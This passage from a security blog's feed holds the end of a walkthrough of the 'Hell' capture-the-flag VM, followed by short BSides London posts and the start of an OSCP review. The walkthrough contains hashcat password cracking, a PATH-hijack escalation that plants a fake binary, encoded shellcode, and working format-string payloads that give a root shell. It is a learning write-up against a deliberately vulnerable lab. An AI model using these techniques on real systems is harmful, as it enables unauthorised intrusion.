</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>No password or keyfile specified.
</span></code></pre></td></tr></table></div></figure>


<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>From: admin@rockyou.com
</span><span class='line'>To: super_admin@hell.com
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009
</span><span class='line'>
</span><span class='line'>Thanks <span class="k">for</span> signing up <span class="k">for</span> your account. I hope you enjoy our services.
</span></code></pre></td></tr></table></div></figure>


<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>G:<span class="se">\D</span>ownloads<span class="se">\o</span>clHashcat-1.21&gt;oclHashcat64.exe -m <span class="m">6211</span> -a <span class="m">0</span> <span class="s2">&quot;g:\downloads\container.tc&quot;</span> g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt
</span><span class='line'>
</span><span class='line'>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
</span><span class='line'>
</span><span class='line'>Session.Name...: oclHashcat
</span><span class='line'>Status.........: Cracked
</span><span class='line'>Input.Mode.....: File <span class="o">(</span>g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt<span class="o">)</span>
</span><span class='line'>Hash.Target....: File <span class="o">(</span>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc<span class="o">)</span>
</span><span class='line'>Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
</span><span class='line'>Time.Started...: Sat Jul <span class="m">12</span> 23:06:15 <span class="m">2014</span> <span class="o">(</span><span class="m">17</span> secs<span class="o">)</span>
</span><span class='line'>Speed.GPU.#1...:    <span class="m">29889</span> H/s
</span><span class='line'>Recovered......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
</span><span class='line'>Progress.......: 496641/14343296 <span class="o">(</span>3.46%<span class="o">)</span>
</span><span class='line'>Skipped........: 0/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>Rejected.......: 1/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>HWMon.GPU.#1...: 97% Util, 56c Temp, 32% Fan
</span><span class='line'>
</span><span class='line'>Started: Sat Jul <span class="m">12</span> 23:06:15 2014
</span><span class='line'>Stopped: Sat Jul <span class="m">12</span> 23:06:37 2014
</span></code></pre></td></tr></table></div></figure>


<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>: ./tc
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>
</span><span class='line'>george@hell:~<span class="nv">$ </span><span class="nb">cd </span>tc
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx------ <span class="m">1</span> george george <span class="m">1679</span> Jul  <span class="m">5</span> 20:01 id_rsa
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~/tc<span class="nv">$ </span>ssh bazza@127.0.0.1 -i ./id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul <span class="m">13</span> 21:18:28 <span class="m">2014</span> from 192.168.0.102
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>bazza
</span></code></pre></td></tr></table></div></figure>


<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>

<hr />

<h2>Bazza&rsquo;s Blockade</h2>

<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>

<p>[c]int <em>_cdecl main()
{
  int result; // eax@6
  </em>BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE <em>v2; // [sp+424h] [bp-Ch]@1
  const char </em>v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1</p>

<p>  v4 = &ldquo;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&rdquo;;
  v3 = &ldquo;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&rdquo;;
  printf(&ldquo;Checking integrity of part2&hellip;&rdquo;);
  v2 = popen(&ldquo;sha256sum /home/bazza/part2&rdquo;, &ldquo;r&rdquo;);
  if ( !v2 )
    puts(&ldquo;Failed to run command&rdquo;);
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts(&ldquo;Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)\n&rdquo;);
    result = 0;
  }
  else
  {
    puts(&ldquo; Done!!\n&rdquo;);
    printf(&ldquo;Checking integrity of calling target&hellip;&rdquo;);
    v2 = popen(&ldquo;sha256sum /usr/bin/id&rdquo;, &ldquo;r&rdquo;);
    if ( !v2 )
      puts(&ldquo;Failed to run command&rdquo;);
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts(&ldquo;Target corrupt\n&rdquo;);
      result = 0;
    }
    else
    {
      puts(&ldquo; Done!!\n\nBinary and target confirmed.&rdquo;);
      system(&ldquo;/home/bazza/part2&rdquo;);
      pclose(v2);
      result = 0;
    }
  }
  return result;
}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so part1 runs part2 <span class="o">(</span>this <span class="nb">time </span>with an absolute path<span class="o">)</span>, so <span class="nb">time </span><span class="k">for</span> a quick peek into part2
</span><span class='line'>
</span><span class='line'><span class="o">[</span>c<span class="o">]</span>int __cdecl main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  __gid_t v0<span class="p">;</span> // eax@2
</span><span class='line'>  int result<span class="p">;</span> // eax@2
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span> getegid<span class="o">()</span> <span class="o">==</span> <span class="m">1003</span> <span class="o">)</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    puts<span class="o">(</span><span class="s2">&quot;\nCan&#39;t touch this *nah na na na na naaaaaaaa nah*&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    <span class="nv">v0</span> <span class="o">=</span> getegid<span class="o">()</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;\n\nError! %d ID detected ... you&#39;re not allowed to run this, please use part 1!\n&quot;</span>, v0<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">return</span> result<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Error! <span class="m">1004</span> ID detected ... you<span class="err">&#39;</span>re not allowed to run this, please use part 1!
</span></code></pre></td></tr></table></div></figure>


<p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can<span class="err">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span>,1004<span class="o">(</span>bazza<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>bazza
</span></code></pre></td></tr></table></div></figure>


<p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1005 );
 system(&ldquo;/usr/bin/id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last <span class="nb">time </span>and we<span class="err">&#39;</span>re good to go.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Success !
</span><span class='line'>
</span><span class='line'>Nearly there, only this hoop to jump through and we<span class="s1">&#39;re done.</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="s1">* * *</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="s1">## Orange Juice Doesn&#39;</span>t Echo
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The OJ user has <span class="m">1</span> file, a binary called <span class="nb">echo </span>which does exactly that, it repeats what you send it. This guy is the height of programming ability. There<span class="s1">&#39;s got to be something wrong with it.</span>
</span><span class='line'><span class="s1">&lt;!-- more --&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a &quot;format string vulnerability&quot;.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">![](https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg)</span>
</span><span class='line'>
</span><span class='line'><span class="s1">wut ?</span>
</span><span class='line'>
</span><span class='line'><span class="s1">What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check [this one out for formatstr vuln explanation](https://www.youtube.com/watch?v=NwzmYSlETI8) and the [follow up](https://www.youtube.com/watch?v=CHrs30g-3O0)) I still felt none the wiser.  But I figured I&#39;</span>d give it a go anyway.  What<span class="s1">&#39;s the worst that can happen ?  I can&#39;</span>t make it any more wrong now can I ?
</span><span class='line'>
</span><span class='line'>Meh, <span class="nb">let</span><span class="s1">&#39;s put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we&#39;</span>re progressing.
</span></code></pre></td></tr></table></div></figure>


<p> bash
export SHELLCODE=$(python -c &lsquo;print &ldquo;\x90&rdquo; * 1000 + &ldquo;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&rdquo;&rsquo;)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>So, I started to play around with gdb and format strings.
</span><span class='line'>There are several ways you can <span class="k">do</span> format string vulnerabilities - you can put your shellcode in memory using an environment variable, <span class="k">then</span> overwrite a global offset table entry to execute your code <span class="o">(</span>as per the videos<span class="o">)</span>, or <span class="k">if</span> you<span class="s1">&#39;re unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that... it didn&#39;</span>t work because my shellcode kept moving in memory.
</span><span class='line'>
</span><span class='line'>!<span class="o">[](</span>http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Apparently, though, you can overwrite entries in the .dtor part of the binary - don<span class="s1">&#39;t ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again... </span>
</span><span class='line'>
</span><span class='line'><span class="s1">Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It&#39;</span>s also pretty obvious when I went back to basics about <span class="m">7</span> attempts in.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>plain<span class="o">]</span>
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x5c\xf8\xff\xbf&quot;&#39;</span><span class="k">)</span>-%64362u-%116<span class="se">\$</span>n
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;AAAA&quot;&#39;</span><span class="k">)</span>-%64362u-%117<span class="se">\$</span>n.
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>%64362u-%119<span class="se">\$</span>n.
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x5c\xf8\xff\xbf&quot; + &quot;\x5e\xf8\xff\xbf&quot;&#39;</span><span class="k">)</span>-%64362u-%4<span class="se">\$</span>n-%5<span class="se">\$</span>n
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x5c\xf8\xff\xbf&quot;&#39;</span><span class="k">)</span>-%116<span class="se">\$</span>n.
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;AAAA&quot;&#39;</span><span class="k">)</span>%117<span class="se">\$</span>x
</span><span class='line'>%64364u<span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>%119<span class="se">\$</span>n.
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAABBBB%49136u%120<span class="se">\$</span>hn%15217u%119<span class="se">\$</span>hn
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AABB-%00001c%116<span class="se">\$</span>.x%00001c%114<span class="se">\$</span>.x
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AABBBB%49134u%113<span class="se">\$</span>hn%15217c%112<span class="se">\$</span>hn
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AABBBB%49134u%118<span class="se">\$</span>hn%15217u%117<span class="se">\$</span>hn
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAAB%49139u%118<span class="se">\$</span>hn%15217c%117<span class="se">\$</span>hn
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAABBBB%49136u%120<span class="se">\$</span>hn%15217c%119<span class="se">\$</span>hn
</span></code></pre></td></tr></table></div></figure>


<p>I spent a lot of time staring at segfault after segfault until I stumbled upon this random combination of characters (I really really want to explain how I worked it out, but I&rsquo;m not 100% sure myself. I guess that&rsquo;s a follow up post sometime. Also, it is possible this wont work for you).</p>

<p>[plain]
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Which when executed like this
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ /home/oj/echo $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>dropped me to a shell.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<h1>id</h1>

<p>uid=0(root) gid=1005(oj) groups=0(root),1005(oj)</p>

<h1>whoami</h1>

<p>root</p>

<h1>cat /root/flag.txt</h1>

<p>Congratulations of beating Hell.</p>

<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>

<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>

<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>

<h1></h1>

<p>&#8220;`</p>

<p><img src="http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif" alt="" /></p>

<p>Like a baws.  Now I&rsquo;m going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSides London - A Retrospective]]></title>
    <link href="http://recrudesce.github.io/2014/04/29/bsides-london-a-retrospective/"/>
    <updated>2014-04-29T21:23:22+01:00</updated>
    <id>http://recrudesce.github.io/2014/04/29/bsides-london-a-retrospective</id>
    <content type="html"><![CDATA[<p>BSides London, BSides London&hellip; what can I say about BSides London&hellip;
Well, for one it&rsquo;s small - if you&rsquo;re expecting a massive convention like Defcon you will be sorely disappointed. But the size doesn&rsquo;t matter when you get to meet revered infosec people like <a href="https://twitter.com/jack_daniel">Jack Daniel</a> (Tenable) , <a href="https://twitter.com/mckeay">Martin McKeay</a>, <a href="https://twitter.com/todb">Tod Beardsley</a> (Metasploit) et al and talk to them on a one to one level about anything (I had a conversation about Hello Kitty with Tod B - that says a lot). Oh, and don&rsquo;t forget the fact that staff members from the ever so epic Offensive Security were there too - I&rsquo;m looking at you <a href="https://twitter.com/g0tmi1k">g0tmi1k</a> :D It was also nice to meet up with <a href="https://twitter.com/NullMode_">Nullmode</a> (forever known as N0tmi1k) and <a href="https://twitter.com/arr0way">Arr0way</a> as well and chat randomly about anything and everything that came to mind.</p>

<!-- more -->


<p>The talks were brilliant and well organised, and the lock picking village allowed me to get my first taste in lock picking - I think I&rsquo;ve gotten the bug now and have already ordered my first set of picks and practice locks. I wasn&rsquo;t able to get to as many talks as I&rsquo;d have liked, but that wasn&rsquo;t an issue due to the people around me who were happy to impart their knowledge and answer any questions asked.</p>

<p>And Tod, if I see any weird transactions on my credit card in the next few days, I know who I&rsquo;m going to ask ;)</p>

<p>The only slight issue with the day was not related to BSides at all - but it was due to the Tube Strike. I&rsquo;d like to extend a personal thank you to all the TFL members of staff who continued to come to work today and assist in keeping London moving at a moderate, but slightly slower, pace than usual. I will not repeat what went through my mind as I walked down onto the platform at Earls Court only to see thousands of people - I couldn&rsquo;t see one inch of the platform ! At no point did I come across a staff member who was nothing but polite and level headed about the whole situation.</p>

<p>After sitting on the floor of a very busy train for the nearly two hour journey home, I was able to reflect on the introduction I&rsquo;d been given to the infosec industry; I mean I&rsquo;m a novice - I&rsquo;ve only been seriously thinking about this as a career path for around a year, if that. There&rsquo;s a lot of people talking about Infosec Burnout at the moment, but I saw nothing of the sort. All I experienced were people who went out of their way to run and attend an event for other like minded people in the industry. Those people pulled out all the stops to make BSides London welcoming, friendly and a lot of fun. I hope the Burnout mentality is just a phase and that it passes quickly so we can continue to host events of this stature.</p>

<p>Here&rsquo;s to next year - and here&rsquo;s to BSides London getting bigger and better.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[BSidesLondon and Infosec]]></title>
    <link href="http://recrudesce.github.io/2014/04/24/bsideslondon-and-infosec/"/>
    <updated>2014-04-24T11:17:02+01:00</updated>
    <id>http://recrudesce.github.io/2014/04/24/bsideslondon-and-infosec</id>
    <content type="html"><![CDATA[<p>With less than a week to go before <a href="https://www.securitybsides.org.uk">BSides London</a> and <a href="http://www.infosec.co.uk">Infosec 2014</a>, I&rsquo;m trying to list out all the people/companies I want to talk to, and also determine whether to take my laptop or my tablet - I&rsquo;m thinking laptop&hellip;</p>

<p>Anyway, quick and simple post this one - I&rsquo;ll be at both events.  You can tweet me <a href="https://twitter.com/recrudesce">@recrudesce</a> if you want to meet up and say &ldquo;hi&rdquo;.</p>

<p>If you&rsquo;re going too, have a good time - remember to get loads of swag ;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OSCP Review]]></title>
    <link href="http://recrudesce.github.io/2014/04/20/oscp-review/"/>
    <updated>2014-04-20T17:11:33+01:00</updated>
    <id>http://recrudesce.github.io/2014/04/20/oscp-review</id>
    <content type="html"><![CDATA[<p>Have you ever purposefully put yourself in a situation that makes you run around the house in glee, and then five minutes later makes you want to put your head through a door ?  No ?  Maybe you should try OSCP.  If being constantly told to &ldquo;try harder&rdquo; doesn&rsquo;t make you want to embed a brick into your eye socket, then maybe this is for you&hellip;</p>

<p>After much research into the Certified Ethical Hacker course, the term &ldquo;OSCP&rdquo; kept cropping up in my google searches.  OSCP&hellip; OSCP&hellip;  what is this mythical OSCP of which you speak !?</p>

<!-- more -->


